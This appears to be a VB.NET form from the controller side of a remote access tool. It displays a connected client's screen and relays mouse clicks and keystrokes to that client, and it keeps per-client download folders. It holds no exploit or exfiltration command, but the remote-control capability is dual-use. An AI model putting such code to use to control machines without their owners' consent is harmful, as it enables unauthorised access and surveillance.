Imports System.ComponentModel
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Web.UI.WebControls
Imports System.Windows.Forms.VisualStyles.VisualStyleElement
Imports Microsoft.VisualBasic.CompilerServices

Public Class FrmDesktop
    Public C As tlscclient
    Public CID As String
    Public Sz As Size
    Public op As New Point(1, 1)
    Public overlayarea As Bitmap
    Function QZ(ByVal q As Integer) As Size '  Lower Size of image
        Try
            Dim zs As New Size(Sz)
            Select Case q
                Case 0
                    Return Sz
                Case 1
                    zs.Width = zs.Width / 1.1
                    zs.Height = zs.Height / 1.1
                Case 2
                    zs.Width = zs.Width / 1.3
                    zs.Height = zs.Height / 1.3
                Case 3
                    zs.Width = zs.Width / 1.5
                    zs.Height = zs.Height / 1.5
                Case 4
                    zs.Width = zs.Width / 1.9
                    zs.Height = zs.Height / 1.9
                Case 5
                    zs.Width = zs.Width / 2
                    zs.Height = zs.Height / 2
                Case 6
                    zs.Width = zs.Width / 2.1
                    zs.Height = zs.Height / 2.1
            End Select
            zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
            zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
            Return zs
        Catch ex As Exception
        End Try
    End Function


    Private Sub RemoteDesktop_Load(sender As Object, e As EventArgs) Handles MyBase.Load


        _keysPressed = New List(Of Keys)()
        Try
            Timer2.Start()
            ComboBox1.Text = "30%"
            Button2.PerformClick()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RemoteDesktop_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Button2.Text = "OFF"
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            ToolStripStatusLabel1.Text = "Size :" & PictureBox1.Width.ToString & "x" & PictureBox1.Height.ToString
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Button2.Text = "Stop" Then
            Button2.Text = "Start"
            ToolStripStatusLabel2.Enabled = False
            ToolStripStatusLabel3.Enabled = False
            Dim B As Byte() = SB("RD+" + Gclass1.SPL + PictureBox1.Width.ToString + Gclass1.SPL + PictureBox1.Height.ToString + Gclass1.SPL + ComboBox1.Text.Replace("%", "").ToString)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Else
            Button2.Text = "Stop"
            ToolStripStatusLabel2.Enabled = True
            ToolStripStatusLabel3.Enabled = True
        End If
    End Sub
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        PictureBox1.Focus()
    End Sub

    Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseUp
        If ToolStripStatusLabel2.ForeColor = Color.Green Then

            If Button2.Text = "Start" Then
                Dim PP = New Point(e.X * (Sz.Width / PictureBox1.Width), e.Y * (Sz.Height / PictureBox1.Height))
                Dim but As Integer
                If e.Button = MouseButtons.Left Then
                    but = 4
                End If
                If e.Button = MouseButtons.Right Then
                    but = 16
                End If

                Dim B As Byte() = SB("###" + Gclass1.SPL & PP.X & Gclass1.SPL & PP.Y & Gclass1.SPL & but)
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            End If
        End If
    End Sub
    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        If ToolStripStatusLabel2.ForeColor = Color.Green Then
            If Button2.Text = "Start." Then
                Dim PP = New Point(e.X * (Sz.Width / PictureBox1.Width), e.Y * (Sz.Height / PictureBox1.Height))
                If PP <> op Then
                    op = PP

                End If
            End If
        End If
    End Sub

    Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDown
        If ToolStripStatusLabel2.ForeColor = Color.Green Then
            If Button2.Text = "Start" Then
                Dim PP = New Point(e.X * (Sz.Width / PictureBox1.Width), e.Y * (Sz.Height / PictureBox1.Height))
                Dim but As Integer
                If e.Button = MouseButtons.Left Then
                    but = 2
                End If
                If e.Button = MouseButtons.Right Then
                    but = 8
                End If


                Dim B As Byte() = SB("###" & Gclass1.SPL & PP.X & Gclass1.SPL & PP.Y & Gclass1.SPL & but)
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            End If
        End If
    End Sub
    Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs)
        If ToolStripStatusLabel2.ForeColor = Color.Green Then
            ToolStripStatusLabel2.ForeColor = Color.Black
        Else
            ToolStripStatusLabel2.ForeColor = Color.Green
        End If
    End Sub

    Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs)
        If ToolStripStatusLabel3.ForeColor = Color.Green Then
            ToolStripStatusLabel3.ForeColor = Color.Black
        Else
            PictureBox1.Focus()
            ToolStripStatusLabel3.ForeColor = Color.Green
        End If
    End Sub
    Private Function IsLockKey(ByVal key As Keys) As Boolean
        Return ((key And Keys.CapsLock) = Keys.CapsLock) OrElse ((key And Keys.NumLock) = Keys.NumLock) OrElse ((key And Keys.Scroll) = Keys.Scroll)
    End Function


    Private Sub PictureBox1_KeyUp(sender As Object, e As KeyEventArgs) Handles PictureBox1.KeyUp
        If ToolStripStatusLabel3.ForeColor = Color.Green Then
            If Button2.Text = "Start" Then
                If Not IsLockKey(e.KeyCode) Then e.Handled = True
                _keysPressed.Remove(e.KeyCode)


                Dim B As Byte() = SB("^^^&" & Gclass1.SPL & e.KeyCode & Gclass1.SPL & "False")
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            End If
        End If
    End Sub

    Private Sub PictureBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles PictureBox1.KeyDown
        If ToolStripStatusLabel3.ForeColor = Color.Green Then
            If Button2.Text = "Start" Then
                If Not IsLockKey(e.KeyCode) Then e.Handled = True
                If _keysPressed.Contains(e.KeyCode) Then Return
                _keysPressed.Add(e.KeyCode)


                Dim B As Byte() = SB("^^^&" & Gclass1.SPL & e.KeyCode & Gclass1.SPL & "True")
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            End If
        End If
    End Sub
    Public _keysPressed As New List(Of Keys)

    Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs)
        If ToolStripStatusLabel4.ForeColor = Color.Green Then
            ToolStripStatusLabel4.ForeColor = Color.White
        Else
            Try
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\Desktop") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\Desktop")
                End If
                Process.Start(Application.StartupPath & "\Downloads" & "\" & CID & "\Desktop")
                ToolStripStatusLabel4.ForeColor = Color.Green
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripStatusLabel6_Click(sender As Object, e As EventArgs)
        Dim B As Byte() = SB("Scale")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs)
        Dim B As Byte() = SB("Scale")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub

    Private Sub ToolStripStatusLabel2_MouseCaptureChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub ToolStripStatusLabel3_MouseCaptureChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub ToolStripStatusLabel2_Click_1(sender As Object, e As EventArgs) Handles ToolStripStatusLabel2.Click
        If ToolStripStatusLabel2.ForeColor = Color.Green Then
            ToolStripStatusLabel2.ForeColor = Color.Black
        Else
            ToolStripStatusLabel2.ForeColor = Color.Green
        End If
    End Sub

    Private Sub ToolStripStatusLabel3_Click_1(sender As Object, e As EventArgs) Handles ToolStripStatusLabel3.Click
        If ToolStripStatusLabel3.ForeColor = Color.Green Then
            ToolStripStatusLabel3.ForeColor = Color.Black
        Else
            PictureBox1.Focus()
            ToolStripStatusLabel3.ForeColor = Color.Green
        End If
    End Sub
    ''' <summary>
    ''' The ReleaseCapture.
    ''' </summary>
    <DllImport("user32.DLL", EntryPoint:="ReleaseCapture")>
    Private Shared Sub ReleaseCapture()
    End Sub

    ''' <summary>
    ''' The SendMessage.
    ''' </summary>
    ''' <paramname="hwnd">The hwnd<seecref="IntPtr"/>.</param>
    ''' <paramname="wmsg">The wmsg<seecref="Integer"/>.</param>
    ''' <paramname="wparam">The wparam<seecref="Integer"/>.</param>
    ''' <paramname="lparam">The lparam<seecref="Integer"/>.</param>
    <DllImport("user32.DLL", EntryPoint:="SendMessage")>
    Private Shared Sub SendMessage(ByVal hwnd As IntPtr, ByVal wmsg As Integer, ByVal wparam As Integer, ByVal lparam As Integer)
    End Sub

    ''' <summary>
    ''' The panel1_MouseDown.
    ''' </summary>
    ''' <paramname="sender">The sender<seecref="Object"/>.</param>
    ''' <paramname="e">The e<seecref="MouseEventArgs"/>.</param>

    Private Sub Guna2Panel2_MouseDown(sender As Object, e As MouseEventArgs) Handles Guna2Panel2.MouseDown
        ReleaseCapture()
        SendMessage(Handle, &H112, &HF012, 0)
    End Sub

    Private Sub ToolStripStatusLabel4_Click_1(sender As Object, e As EventArgs) Handles ToolStripStatusLabel4.Click
        If ToolStripStatusLabel4.ForeColor = Color.Green Then
            ToolStripStatusLabel4.ForeColor = Color.White
        Else
            Try
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\Desktop") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\Desktop")
                End If
                Process.Start(Application.StartupPath & "\Downloads" & "\" & CID & "\Desktop")
                ToolStripStatusLabel4.ForeColor = Color.Green
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs)
        Dim B As Byte() = SB("Scale")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub
End Class